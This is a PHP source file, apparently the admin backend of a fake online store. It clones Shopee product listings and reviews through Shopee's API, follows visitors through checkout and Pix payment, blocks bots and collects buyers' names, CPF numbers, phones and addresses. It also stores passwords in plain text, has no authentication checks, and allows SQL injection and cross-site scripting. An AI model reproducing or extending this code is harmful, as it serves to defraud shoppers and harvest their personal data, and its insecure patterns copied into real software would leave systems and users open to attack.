<?php 
  
   require_once("../../api/db.php");
  
   switch($_POST["painel"]){
  
	case "online":
	
	        $QUERY2 = "SELECT COUNT(*) FROM bot";
			$rob = mysqli_query($conn, $QUERY2);
			$row = mysqli_fetch_array($rob);
			$bot = $row['COUNT(*)'];
			
		    $QUERY4 = "SELECT COUNT(*) FROM mobile";
			$mob = mysqli_query($conn, $QUERY4);
			$row = mysqli_fetch_array($mob);
			$mobile = $row['COUNT(*)'];

			$QUERY5 = "SELECT COUNT(*) FROM desktop";
			$desk = mysqli_query($conn, $QUERY5);
			$row = mysqli_fetch_array($desk);
			$desktop = $row['COUNT(*)'];
			
			$QUERY6 = "SELECT COUNT(*) FROM clientes";
			$cli = mysqli_query($conn, $QUERY6);
			$rowx = mysqli_fetch_array($cli);
			$cliente = $rowx['COUNT(*)'];
			
			$QUERY7 = "SELECT COUNT(*) FROM pixgerado";
			$cli7 = mysqli_query($conn, $QUERY7);
			$rowx7 = mysqli_fetch_array($cli7);
			$pixpix = $rowx7['COUNT(*)'];
			
			$cliques = $mobile + $desktop;
				
	$sql = mysqli_query($conn, "SELECT count(id) as online FROM online WHERE time >= '" . time() . "'");
	$resp = mysqli_fetch_assoc($sql);
	$totalOn = $resp['online'];
	
	$sql = mysqli_query($conn, "SELECT count(id) as online FROM online WHERE situacao='desativo'");
	$respx = mysqli_fetch_assoc($sql);
	$block = $respx['online'];
	               /*        
				 $total = 0;
				 $sql = mysqli_query($conn, "SELECT * from pixgerado");
	             if(mysqli_num_rows($sql) > 0){
					// $sql = mysqli_query($conn, "SELECT * FROM pixgerado WHERE valor");
					 $sql = mysqli_query($conn, "SELECT * FROM pixgerado");
					 while($rowx = mysqli_fetch_array($sql)){ 
					 $valor = $rowx["valor"];
					 
					 if(strlen($valor) == 8){
					  $new = str_replace(".", "", $valor);
					  $new2 = str_replace(",", ".", $new);
					  $total += $new2;
					}else{
					  $new2 = str_replace(",", ".", $valor);
					  $total +=  $new2;
					 }
					 }
					 
					 if(strlen($total) > 6){
					  $totalSomado = number_format($total, 2, ",", ".");
					 }else{
					  $totalSomado =  $total;
					 }
				 }else{
				  $totalSomado=0;
				 }*/
				 
				
	
	
	echo "$totalOn|$cliques|$desktop|$mobile|$bot|$cliente|$block|$pixpix";
	
	break; //=============================================

	case "lista_online": 
	
	$sql = mysqli_query($conn, "SELECT * from online");
	if(mysqli_num_rows($sql) > 0){
	    
		$sql = mysqli_query($conn, "SELECT * FROM online WHERE time >= '" . time() . "'");
		 while($rowx = mysqli_fetch_array($sql)){ 
	     
		 $id = $rowx["id"];
	     $etapa = $rowx["etapa"];
	 	 $cidade= $rowx["cidade"];
		 $estado= $rowx["estado"];
		 $dispositivo = $rowx["dispositivo"];
		 $hora = $rowx["hora"];
		 

		 if($etapa=="produto"){
		 $etapa = "Produto";
		 $icon = "store";
		 }
		 if($etapa=="checkout"){
		 $etapa = "Checkout";
		 $icon = "shopping_cart";
		 }		 
		 if($etapa=="address"){
		 $etapa = "Endereço";
		 $icon = "post_add";
		 }
		 if($etapa=="confirm"){
		 $etapa = "Confirma endereço";
		 $icon = "post_add";
		 }
		 if($etapa=="payment"){
		 $etapa = "Pagamento";
		 $icon = "request_page";
		  }
		 if($etapa=="pix"){
		 $etapa = "Pagar Pix";
		 $icon = "price_check";
		 }		
		 if($etapa=="parado"){
		 $etapa = "está parado";
		 $icon = "elderly";
		 }	

		 if($etapa=="erro404"){
		 $etapa = "Caiu no erro 404";
		 $icon = "warning";
		 }		 
		 
		          echo '<tr>
                    <td class="align-middle text-center">
                      <div class="d-flex px-2 py-1" style="display: flex;align-items: flex-start;">
                      <div><i class="material-icons text-dark text-gradient" style="font-size: 1.575rem;">'.$icon.'</i></div>
                      <div class="d-flex flex-column justify-content-center"><h6 class="mb-0 text-sm">&nbsp;'.$etapa.'</h6></div>
                      </div>
                    </td>
					<td class="align-middle text-center">
                       <span class="text-xs font-weight-bold">'.$dispositivo.'</span>
                    </td>
                    <td class="align-middle text-center">
                       <span class="text-xs font-weight-bold">'.$cidade.'/'.$estado.'</span>
                    </td>
                    <td class="align-middle text-center">
                       <span class="text-xs font-weight-bold">'.$hora.'</span>
                    </td>
                    <td class="align-middle text-center">
                       <div class="d-flex align-items-center text-sm">
                       <span id='.$id.' style="cursor:pointer;" class="badge badge-sm bg-gradient-danger toast-btn" data-target="infoToast" onclick="sendBlock(this.id);">Bloquear</span>
                       </div>
                    </td>
					</tr>';
		}
	}else{
	 echo "";
	}
	
	break; //=============================================
	
	
	case "lista_pix": 
	
	$sql = mysqli_query($conn, "SELECT * from pixgerado");
	if(mysqli_num_rows($sql) > 0){
	    
		$sql = mysqli_query($conn, "SELECT * FROM pixgerado WHERE time >= '" . time() . "'");
		 while($rowx = mysqli_fetch_array($sql)){ 
	     
		 $id = $rowx["id"];
		 $valor = $rowx["valor"];
		 $produto = $rowx["produto"];
		 $hora = $rowx["hora"]; 
		 
		          echo '<div class="timeline-block mb-3">
						  <span class="timeline-step">
							<i class="material-icons text-success text-gradient">attach_money</i>
						  </span>
						  <div class="timeline-content">
							<h6 class="text-dark text-sm font-weight-bold mb-0">Pix no valor '.$valor.' foi gerado! &#x1F910;</h6>
							<p class="text-secondary font-weight-bold text-xs mt-1 mb-0">Ás '.$hora.'</p>
						  </div>
						</div>';
		}
		
	}else{
	 echo "";
	}
	
	break; //=============================================
	
	case "blockUser":
	
	$id = addslashes($_POST["user"]);
	
	         $sql = mysqli_query($conn, "SELECT * from online");
	         if(mysqli_num_rows($sql) > 0){
			 $sqlxx = mysqli_query($conn, "SELECT * from online WHERE id='$id'");
	         if(mysqli_num_rows($sqlxx) > 0){
			 $query = mysqli_query($conn, "UPDATE online SET situacao='desativo' WHERE id='$id'");
			 }else{
			 $query = mysqli_query($conn, "INSERT INTO online (ip, situacao) VALUES ('$ip', 'desativo')");
			 }
			 }else{
			 $query = mysqli_query($conn, "INSERT INTO online (ip, situacao) VALUES ('$ip', 'desativo')");
			 }
	
	break; //=============================================
	
	case "cadastros":
	        						
            
			 $sql = mysqli_query($conn, "SELECT * from clientes");
	         if(mysqli_num_rows($sql) > 0){
				
				$sql = mysqli_query($conn, "SELECT * FROM clientes");
				 while($rowx = mysqli_fetch_array($sql)){ 
				 
				 $id = $rowx["id"];
				 $nome = $rowx["nome"];
				 $email = $rowx["email"];
				 $cpf = $rowx["cpf"];
				 $celular = $rowx["celular"];
				 
		         $cep = $rowx["cep"];##
				 $endereco = $rowx["endereco"];##
				 $numero = $rowx["numero"];##
				 $bairro = $rowx["bairro"];##
				 $cidade = $rowx["cidade"];##
				 $complemento = $rowx["complemento"];
				 
				 $destinatario = $rowx["destinatario"];
				 
				 $quantidade = $rowx["quantidade"];
				 $valortotal = $rowx["valortotal"];
				 
				 $produto = $rowx["itemcomprado"];
				
				 
				 //$datahora = $rowx["hora"];
				 $ip = $rowx["ip"];
				
							
                echo '<tr>
                      <td>
                        <div class="d-flex px-2 py-1">
                         
                          <div class="d-flex flex-column justify-content-center">
                            <h6 class="mb-0 text-sm">'.$nome.'</h6>
                           
                          </div>
                        </div>
                      </td>
                      <td>
                        <h6 class="mb-0 text-sm">'.$email.'</h6>
                        
                      </td>
					
                      <td class="align-middle text-center">
                        <h6 class="mb-0 text-sm">'.$cpf.'</h6>
                      </td>
					  
					  <td class="align-middle text-center">
                        <h6 class="mb-0 text-sm">'.$celular.'</h6>
                      </td>
                 
					  <td class="align-middle text-center">
					    <h6 class="mb-0 text-sm">'.$endereco.', '.$numero.', '.$bairro.'</h6>
                        <span class="text-secondary text-xs font-weight-bold">'.$complemento.', '.$destinatario.', '.$cidade.' - '.$cep.'</span>
                      </td>
					  
					  <td class="align-middle text-center">
                        <h6 class="mb-0 text-sm">'.$produto.'</h6>
                      </td>
					  
					  <td class="align-middle text-center">
					    <h6 class="mb-0 text-sm">'.$quantidade.'</h6>
                        <span class="text-secondary text-xs font-weight-bold">'.$valortotal.'</span>
                      </td>
					 
					 					  
                      <td class="align-middle">
                       <span id="'.$id.'" onclick="excluir(this.id);" style="cursor:pointer;" class="badge badge-sm bg-gradient-dark toast-btn" data-target="infoToast">Delete</span>
                       <span id="'.$ip.'" onclick="sendBlock(this.id)" style="cursor:pointer;" class="badge badge-sm bg-gradient-danger toast-btn" data-target="infoToastBlock">Block</span>
                      </td>
                    </tr>';
						
				}
				
			}else{
			 echo "";
			}
	break;
	
	case "totalcadastros":
	
	        $QUERY5 = "SELECT COUNT(*) FROM clientes";
			$desk = mysqli_query($conn, $QUERY5);
			$row = mysqli_fetch_array($desk);
			$totalcadastros = $row['COUNT(*)'];
			
			echo $totalcadastros;
			
	break; //=============================================
	
	case "bloqueados":
	
	$sql = mysqli_query($conn, "SELECT * from online");
	         if(mysqli_num_rows($sql) > 0){
				
				$sql = mysqli_query($conn, "SELECT * FROM online WHERE situacao='desativo'");
				 while($rowx = mysqli_fetch_array($sql)){ 
				 
				 $id = $rowx["id"];
				 $ip = $rowx["ip"];
				 $etapa = $rowx["etapa"];
				 $cidade = $rowx["cidade"];
				 $estado = $rowx["estado"];
				 $dispositivo = $rowx["dispositivo"];
				 $hora = $rowx["hora"];
				
				 echo '<tr>
                      <td>
                        <div class="d-flex px-2 py-1">
                         
                          <div class="d-flex flex-column justify-content-center">
                            <h6 class="mb-0 text-sm">'.$etapa.'</h6>
                          </div>
                        </div>
                      </td>
                      <td>
                        <h6 class="mb-0 text-sm">'.$cidade.'</h6>
                        <p class="text-xs text-secondary mb-0">'.$estado.'</p>
                      </td>
					
                      <td class="align-middle text-center">
                        <h6 class="mb-0 text-sm">'.$dispositivo.'</h6>
                      </td>
                 
					  <td class="align-middle text-center">
					    <h6 class="mb-0 text-sm">'.$hora.'</h6>
                      </td>
					 					  
                      <td class="align-middle" text-center">
                       <span id="'.$id.'" onclick="desblock(this.id)" style="cursor:pointer;" class="badge badge-sm bg-gradient-dark toast-btn" data-target="infoToast">Desbloquear</span>
                      </td>
                    </tr>
				';
								
				}
				
			}else{
			 echo "";
			}
	break;
	
	case "excluirProduto":
	$id = addslashes($_POST["id"]);
	$query = mysqli_query($conn, "DELETE FROM produto WHERE id='$id'");
	break;
	
	case "desbloquear":
	$id = addslashes($_POST["user"]);
	$query = mysqli_query($conn, "DELETE FROM online WHERE id='$id'");
	break;
	
	case "excluir":
	$id = addslashes($_POST["user"]);
	$query = mysqli_query($conn, "DELETE FROM clientes WHERE id='$id'");
	
	break; //==============================
	
	
	case "total_de_bloqueados":
	
	$sql = mysqli_query($conn, "SELECT count(id) as online FROM online WHERE situacao='desativo'");
	$respx = mysqli_fetch_assoc($sql);
	
    echo $respx['online'];
	
	break;
	
		
		case "addproduto":
		
		$NOME = addslashes($_POST["nome"]);
		$DESCONTO = addslashes($_POST["desconto"]);
		$TEXTODESCRICAO = addslashes($_POST["textodescricao"]);
		$VALOR = addslashes($_POST["valor"]);
		$OFERTA = addslashes($_POST["oferta"]);
		$IDPRODUTO = rand(999,999999999) . time() ;
		$IDIMG = $IDPRODUTO.".png";
		
		if($OFERTA==1){
		$RESP = "desativo";
		}
		else if($OFERTA==1){
		$RESP = "ativo";
		}
		
		$sql = mysqli_query($conn, "SELECT * from produto WHERE codigo='$IDPRODUTO'");
		if(mysqli_num_rows($sql) > 0){
		echo "ja_foi_cadastrado";
		}else{
		$xx = "INSERT INTO `produto`(`codigo`, `nome`, `valor`, `img`, `oferta`, `desconto`, `descricao`, `venda`, `cliques`) VALUES ('$IDPRODUTO', '$NOME', '$VALOR', '$IDIMG', '$OFERTA', '$DESCONTO', '$TEXTODESCRICAO', '0', '0')";
		if(mysqli_query($conn, $xx)){
		 echo "ok|$IDPRODUTO";
		}else{
		 echo 'erro';
		 }
		}
		
		break;

		case "addproduto_v2":
		
		$NOME = addslashes($_POST["nome"]);
		$DESCONTO = addslashes($_POST["desconto"]);
		$TEXTODESCRICAO = addslashes($_POST["textodescricao"]);
		$CARACTERISTICAS = addslashes($_POST["caracteristicas"]);
			$REVIEWS = addslashes($_POST["reviews"]);
			$VALOR = addslashes($_POST["valor"]);
			$VALOR_ORIGINAL = addslashes($_POST["valor_original"]);
			$OFERTA = addslashes($_POST["oferta"]);
		$IDPRODUTO = rand(999,999999999) . time() ;
		
		$img1 = addslashes($_POST["img1"]);
		$img2 = addslashes($_POST["img2"]);
		$img3 = addslashes($_POST["img3"]);
		$img4 = addslashes($_POST["img4"]);
		$img5 = addslashes($_POST["img5"]);
		$img6 = addslashes($_POST["img6"]);
		
		// Usar a img1 como imagem principal legado
		$IDIMG = $img1;
		
		$sql = mysqli_query($conn, "SELECT * from produto WHERE codigo='$IDPRODUTO'");
		if(mysqli_num_rows($sql) > 0){
			echo "ja_foi_cadastrado";
		}else{
				// Tenta inserir com valor_original, se falhar tenta sem (para compatibilidade)
				$xx = "INSERT INTO `produto`(`codigo`, `nome`, `valor`, `img`, `oferta`, `desconto`, `descricao`, `venda`, `cliques`, `img1`, `img2`, `img3`, `img4`, `img5`, `img6`, `caracteristicas`, `reviews`, `valor_original`) VALUES ('$IDPRODUTO', '$NOME', '$VALOR', '$IDIMG', '$OFERTA', '$DESCONTO', '$TEXTODESCRICAO', '0', '0', '$img1', '$img2', '$img3', '$img4', '$img5', '$img6', '$CARACTERISTICAS', '$REVIEWS', '$VALOR_ORIGINAL')";
				
					if(!mysqli_query($conn, $xx)){
						$error_msg = mysqli_error($conn);
						// Se o erro for coluna desconhecida OU tabela inexistente (caso o nome esteja errado no banco)
						if(strpos($error_msg, "Unknown column 'valor_original'") !== false || strpos($error_msg, "doesn't exist") !== false){
							// Tenta a query simplificada (sem valor_original)
							$xx_simple = "INSERT INTO `produto`(`codigo`, `nome`, `valor`, `img`, `oferta`, `desconto`, `descricao`, `venda`, `cliques`, `img1`, `img2`, `img3`, `img4`, `img5`, `img6`, `caracteristicas`, `reviews`) VALUES ('$IDPRODUTO', '$NOME', '$VALOR', '$IDIMG', '$OFERTA', '$DESCONTO', '$TEXTODESCRICAO', '0', '0', '$img1', '$img2', '$img3', '$img4', '$img5', '$img6', '$CARACTERISTICAS', '$REVIEWS')";
							if(mysqli_query($conn, $xx_simple)){
								echo "ok|$IDPRODUTO";
							} else {
								echo 'erro: ' . mysqli_error($conn) . " (Query tentada: $xx_simple)";
							}
						} else {
							echo 'erro: ' . $error_msg;
						}
					} else {
						echo "ok|$IDPRODUTO";
					}
				

		}
		
		break;
	
	case "codigoProduto":
	
						function getStr($string, $start, $end) {
						$str = explode($start, $string);
						$str = explode($end, $str[1]);
						return $str[0];
						}

						function multiexplode ($delimiters,$string) {
							$ready = str_replace($delimiters, $delimiters[0], $string);
							$launch = explode($delimiters[0], $ready);
							return  $launch;
						}

						$codigo = $_POST['codigox'];

						if(strpos($codigo, "?")){
						$x1 = getStr($codigo, 'i.','?');
						$shopid = multiexplode(array("."),$x1)[0];
						$itemid = multiexplode(array("."),$x1)[1];
						}else{
						$x2 = explode("i.", $codigo);
						$shopid = multiexplode(array("."),$x2[1])[0];
						$itemid = multiexplode(array("."),$x2[1])[1];
						}
                       
					   #######################################################################################
					   // DADOS DO VENDEDOR
					    $ch = curl_init("https://shopee.com.br/api/v4/product/get_shop_info?shopid=$shopid");
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						curl_setopt($ch, CURLOPT_HTTPHEADER, array(
						'Host: shopee.com.br',
				        'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0'));
						$jsonProprietario = curl_exec($ch);
						curl_close($ch);

						$itemsChaves = json_decode($jsonProprietario, true);
						$imgLoja = $itemsChaves["data"]["account"]["portrait"];
						$nomeLoja = $itemsChaves["data"]["account"]["username"];
						
					    #######################################################################################
					    // COMENTARIOS DOS COMPRADORES
						$ch = curl_init("https://shopee.com.br/api/v2/item/get_ratings?flag=1&itemid=$itemid&limit=3&offset=0&shopid=$shopid");
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						curl_setopt($ch, CURLOPT_HTTPHEADER, array(
						'Host: shopee.com.br',
				        'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0'));
						$jsonComent = curl_exec($ch);
						curl_close($ch);

						$jsonComentarios = json_decode($jsonComent, true);
						$AllComent1 = $jsonComentarios["data"]["ratings"];
						$AllComent = json_encode($AllComent1, true);
						
						#######################################################################################
						// DADOS DO PRODUTO
						$ch = curl_init("https://shopee.com.br/api/v4/item/get?itemid=$itemid&shopid=$shopid");
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						curl_setopt($ch, CURLOPT_HTTPHEADER, array(
						'Host: shopee.com.br',
				        'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0'));
						$jsonDadosPro = curl_exec($ch);
						curl_close($ch);
						
						$chaves = json_decode($jsonDadosPro, true);
						
						################################################
						// ESSE CODIGO E PARA PEGAR CORES, IMAGENS E TAMANHO CASO AJA NO PRODUTO!
						$jsonInfos = $chaves["data"]["tier_variations"];
						$jsonInfoCorTm = json_encode($jsonInfos, true);
						
						if($chaves["data"]==NULL){
						
						echo "invalido";
						
						}else{
						
						$nomeProduto = $chaves["data"]["name"];
						$valorProduto = $chaves["data"]["price"];
						$descricao2 = $chaves["data"]["description"];
					    
					    $arrayImgs = $chaves["data"]["images"];
						//$totalImg = count($arrayImgs);
						$JsonImgs = json_encode($arrayImgs, true);
						$desArray = $chaves["data"]["attributes"];
						
						if($desArray==NULL){
						$estoque = $chaves["data"]["stock"];
						echo "$JsonImgs|$estoque|$descricao2|$nomeProduto|$itemid|$imgLoja|$nomeLoja|$AllComent|$jsonInfoCorTm";
						}else{
						$desJson = json_encode($chaves["data"]["attributes"], true);
						echo "$JsonImgs|$desJson|$descricao2|$nomeProduto|$itemid|$imgLoja|$nomeLoja|$AllComent|$jsonInfoCorTm";
						}
						
					}	
						
	break;
	
	case "usuario":
	
	$login = addslashes($_POST["login"]);
	$senha = addslashes($_POST["senha"]);

	$sql = mysqli_query($conn, "SELECT * from acesso WHERE login='$login' and senha='$senha'");
	if(mysqli_num_rows($sql) > 0){
	session_start();
	$tempo = time() + 4000;
	$_SESSION['login'] = $login;
	$_SESSION['senha'] = $senha;
	$_SESSION['tempo'] = $tempo;
	 echo "sucesso";
	}else{
	echo "erro";
	}
	
	break;
	
	case "zerar":
	
	$id = addslashes($_POST["comando"]);
	
	if($id=="cliques"){
	$query = mysqli_query($conn, "DELETE FROM mobile");
	$query = mysqli_query($conn, "DELETE FROM desktop");
	}
	if($id=="bloqueado"){
	$query = mysqli_query($conn, "DELETE FROM online");
	}
	if($id=="mobile"){
	$query = mysqli_query($conn, "DELETE FROM mobile");
	}
	if($id=="desktop"){
	$query = mysqli_query($conn, "DELETE FROM desktop");
	}
	if($id=="bot"){
	$query = mysqli_query($conn, "DELETE FROM bot");
	}
	if($id=="estimativa"){
	$query = mysqli_query($conn, "DELETE FROM pixgerado");
	}
	if($id=="cadastro"){
	$query = mysqli_query($conn, "DELETE FROM clientes");
	}	
	
	break;
	
	
   case "lista_de_adms":
	
	$sql = mysqli_query($conn, "SELECT * from acesso");
	         if(mysqli_num_rows($sql) > 0){
				
				$sql = mysqli_query($conn, "SELECT * FROM acesso");
				 while($rowx = mysqli_fetch_array($sql)){ 
				 
				 $id = $rowx["id"];
				 $login = $rowx["login"];
				 $senha = $rowx["senha"];
				 $acesso = $rowx["acesso"];
				
				$primeira = substr($senha, 0, 1);
				$ultima = substr($senha, -1);
				
				echo '<li class="list-group-item border-0 d-flex align-items-center px-0 mb-2 pt-0">
                      <div class="avatar me-3">
                        <img src="./assets/img/the.png" alt="kal" class="border-radius-lg shadow">
                      </div>
                      <div class="d-flex align-items-start flex-column justify-content-center">
                        <h6 class="mb-0 text-sm">Login: '.$login.'</h6>
                        <h6 class="mb-0 text-sm">Senha: '.$primeira.'******'.$ultima.'</h6>
                      </div>
                      <a class="btn btn-link pe-3 ps-0 mb-0 ms-auto w-25 w-md-auto" href="javascript:;"><span style="cursor:pointer;" class="badge badge-sm bg-gradient-dark fixed-plugin-button">Editar</span></a>
                    </li>  ';
				}
				
			}else{
			 echo "";
			}
	break;
	
	case "cadastrarAdm":
	
	$login = addslashes($_POST["login"]);
	$senha = addslashes($_POST["senha"]);
	
	               $sql = mysqli_query($conn, "SELECT * from acesso"); 
				   if(mysqli_num_rows($sql) > 0){ 
				   }else{
				    $query = mysqli_query($conn, "INSERT INTO acesso (login, senha, acesso) VALUES ('$login', '$senha', 'ativo')");
				   }
	break;

	case "atualizarLoja":
	
	$cor = addslashes($_POST["cor"]);
	$nome = addslashes($_POST["nome"]);
	$zap = addslashes($_POST["zap"]);
	$texto = addslashes($_POST["texto"]);
	
	              
				  $query = mysqli_query($conn, "UPDATE config SET nome='$nome', cor='$cor', numero='$zap', texto='$texto' WHERE id='1'");
				  if($query){
				   echo "ok";
				  }else{
				   echo "erro";
				  }
	break;
	
	case "trocapix":
	
	$chave0 = addslashes($_POST["chave"]);
	$city = addslashes($_POST["cidade"]);
	$identificador = addslashes($_POST["identificador"]);
	$descricao = addslashes($_POST["descricao"]);
	$beneficiario = addslashes($_POST["beneficiario"]);
	$cidade = strtoupper($city);
		$chave = trim($chave0);
		$freepay_public = addslashes($_POST["freepay_public"]);
		$freepay_secret = addslashes($_POST["freepay_secret"]);
		$use_freepay = addslashes($_POST["use_freepay"]);
		 
					  $query = mysqli_query($conn, "UPDATE pix SET chave='$chave', cidade='$cidade', identificador='$identificador', descricao='$descricao', beneficiario='$beneficiario', freepay_public_key='$freepay_public', freepay_secret_key='$freepay_secret', use_freepay='$use_freepay' WHERE id='1'");
				  if($query){
				   echo "ok";
				  }else{
				   echo "erro";
				  }
	break;

	case "totalprodutos":
	$sql = mysqli_query($conn, "SELECT count(id) as produto FROM produto");
	$resp = mysqli_fetch_assoc($sql);
	echo $resp['produto'];
	break;
    
	
	case "apizap":
	
	            $sql = mysqli_query($conn, "SELECT * from apis");
	            if(mysqli_num_rows($sql) > 0){
				
				$sql = mysqli_query($conn, "SELECT * FROM apis");
				 while($rowx = mysqli_fetch_array($sql)){ 
				 
				 $zap = $rowx["zap"];	
				 
				 }
				 
				 if(strlen($zap) > 20){
				 echo '<tr>
                      <td>
                        <div class="d-flex px-2 py-1">
                          <div class="d-flex flex-column justify-content-center">
                            <h6 class="mb-0 text-sm">'.$zap.'</h6>
                          </div>
                        </div>
                      </td>	
					  
                      <td class="align-middle">
                       <span id="zap" onclick="excluir(this.id);" style="cursor:pointer;" class="badge badge-sm bg-gradient-dark toast-btn" data-target="infoToast">Delete</span>
                      </td>
                    </tr>';	
				 }else{
				 echo '
				 <button style="margin-left: 20px; margin-top: 10px;" type="button" class="btn bg-gradient-info" data-bs-toggle="modal" data-bs-target="#exampleModal1x">
				  Inserir api whatsapp
				</button>

				<div class="modal fade" id="exampleModal1x" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
				  <div class="modal-dialog modal-dialog-centered" role="document">
					<div class="modal-content">
					  <div class="modal-header">
						<h5 class="modal-title font-weight-normal" id="exampleModalLabel">Link api</h5>
						<button type="button" class="btn-close text-dark" data-bs-dismiss="modal" aria-label="Close">
						  <span aria-hidden="true">&times;</span>
						</button>
					  </div>
					  <div class="modal-body">
						 <textarea class="multisteps-form__textarea form-control" rows="5" spellcheck="false" id="salvarLinkApiZap"></textarea>
					  </div>
					  <div class="modal-footer">
						<button type="button" class="btn bg-gradient-secondary" data-bs-dismiss="modal">Fechar</button>
						<button type="button" class="btn bg-gradient-success" onclick="salvarLinkApiZap()">Salvar</button>
					  </div>
					</div>
				  </div>
				</div>
				 ';
				 }
                  			 
				 }
				 
				 else{
				 echo "";
				 }
	
	
	break;
	
	
	case "apihtml":
	
	            $sql = mysqli_query($conn, "SELECT * from apis");
	            if(mysqli_num_rows($sql) > 0){
				
				$sql = mysqli_query($conn, "SELECT * FROM apis");
				 while($rowx = mysqli_fetch_array($sql)){ 
				 
				 $emailx = $rowx["email"];
				 
				 }
				 
				  if(strpos($emailx, "@")){
				  $partes = explode("|", $emailx);
				  
				  echo '<tr>
                      <td>
                        <h6 class="mb-0 text-sm">'.$partes[0].'</h6>
						<span class="text-secondary text-xs font-weight-bold">'.$partes[1].'</span>
                      </td>					  
                      <td class="align-middle">
                       <span id="email" onclick="excluir(this.id);" style="cursor:pointer;" class="badge badge-sm bg-gradient-dark toast-btn" data-target="infoToast">Delete</span>
                      </td>
                    </tr>';
				  }else{
				  echo '
				  <button style="margin-left: 20px; margin-top: 10px;" type="button" class="btn bg-gradient-info" data-bs-toggle="modal" data-bs-target="#exampleModal00">
				  Inserir gmail autenticado
				</button>

				<div class="modal fade" id="exampleModal00" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
				  <div class="modal-dialog modal-dialog-centered" role="document">
					<div class="modal-content">
					  <div class="modal-header">
						<h5 class="modal-title font-weight-normal" id="exampleModalLabel">Colocar email e senha PHPMailer</h5>
						<button type="button" class="btn-close text-dark" data-bs-dismiss="modal" aria-label="Close">
						  <span aria-hidden="true">&times;</span>
						</button>
					  </div>
					  <div class="modal-body">
						 <textarea class="multisteps-form__textarea form-control" rows="5" spellcheck="false" id="salvarLinkApiEmail" placeholder="separe o email e a senha por uma barra | &#10;Exemplo: thefake@gmail.com|12345"></textarea>
					  </div>
					  <div class="modal-footer">
						<button type="button" class="btn bg-gradient-secondary" data-bs-dismiss="modal">Fechar</button>
						<button type="button" class="btn bg-gradient-success" onclick="salvarLinkApiEmail()">Salvar</button>
					  </div>
					</div>
				  </div>
				</div>
				  ';
				  }
				  				 
				 }
				 
				 else{
				 echo "";
				 }
	
	break;
	
	case "textoszap":
	            $sql = mysqli_query($conn, "SELECT * from apis");
	            if(mysqli_num_rows($sql) > 0){
				
				$sql = mysqli_query($conn, "SELECT * FROM apis");
				 while($rowx = mysqli_fetch_array($sql)){ 
				 
				 $textozap = $rowx["textozap"];
				 
				 }
				 
				 echo $textozap;
				 
				 }else{
				 echo "........!";
				 }
	break;
	
	case "textoshtml":
	
	 $sql = mysqli_query($conn, "SELECT * from apis");
	            if(mysqli_num_rows($sql) > 0){
				
				$sql = mysqli_query($conn, "SELECT * FROM apis");
				 while($rowx = mysqli_fetch_array($sql)){ 
				 
				 $htmlemail = $rowx["htmlemail"];
				 $texto1email = $rowx["texto1email"];
				 
				 }
				 
				 $html1 = trim($htmlemail);
				 $texto1 = trim($texto1email);
				 
				 echo $html1.'|'.$texto1;
				 
				 }else{
				 echo "........!|........!";
				 }
	break;
	
	case "excluirApi";
	
	$qual = addslashes($_POST["qual"]);
	
 	
				  $query = mysqli_query($conn, "UPDATE apis SET $qual='' WHERE id='1'");
				  if($query){
				   echo "ok";
				  }else{
				   echo "erro";
				  }
	
	break;

	case "salvarZAP";
	$texto = addslashes($_POST["codigo"]);
	
				  $query = mysqli_query($conn, "UPDATE apis SET textozap='$texto' WHERE id='1'");
				  if($query){
				   echo "ok";
				  }else{
				   echo "erro";
				  }
	break;

	case "salvarHTML";
	$textoHTML1 = addslashes($_POST["codigo"]);
	$textoHTML2 = addslashes($_POST["texto"]);
	
	$texto1 = ltrim($textoHTML1);
	$texto2 = ltrim($textoHTML2);
	
				  $query = mysqli_query($conn, "UPDATE apis SET htmlemail='$texto1', texto1email='$texto2' WHERE id='1'");
				  if($query){
				   echo "ok";
				  }else{
				   echo "erro";
				  }
	break;
	
	
	//##########################################
	
	
	case "salvarLinkApiEmail";
	
	$qual = addslashes($_POST["qual"]);
 	
				  $query = mysqli_query($conn, "UPDATE apis SET email='$qual' WHERE id='1'");
				  if($query){
				   echo "ok";
				  }else{
				   echo "erro";
				  }
	
	break;
	
	
	case "salvarLinkApiZap";
	
	$qual = addslashes($_POST["qual"]);
 	
				  $query = mysqli_query($conn, "UPDATE apis SET zap='$qual' WHERE id='1'");
				  if($query){
				   echo "ok";
				  }else{
				   echo "erro";
				  }
	
	break;
	
	
	
	
	
	
	
	
	
	
	
  }
  
?>